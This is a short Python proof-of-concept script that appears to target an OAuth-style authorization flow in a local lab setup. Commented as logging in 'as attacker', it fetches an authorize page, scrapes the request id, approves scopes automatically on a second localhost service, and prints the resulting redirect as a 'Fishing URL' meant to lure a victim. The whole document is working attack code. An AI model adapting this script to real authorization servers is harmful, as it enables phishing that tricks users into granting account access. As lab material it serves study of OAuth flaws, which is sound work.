import requests
from bs4 import BeautifulSoup

session = requests.session()

# login as attacker
payload = {'name': 'bob', 'password': 'hoge'}
res = session.post('http://localhost:10000/login', data=payload)

# authorize request
res = session.get('http://localhost:10000/authorize')

# approve request
soup = BeautifulSoup(res.text, features="html.parser")
payload = {'reqid': soup.input['value'], 'scope_hoge': 'on', 'scope_huga': 'on', 'approve': 'Approve'}
res = session.post('http://localhost:10001/approve', data=payload, allow_redirects=False)

# generated url
print("Fishing URL:", res.headers['Location'])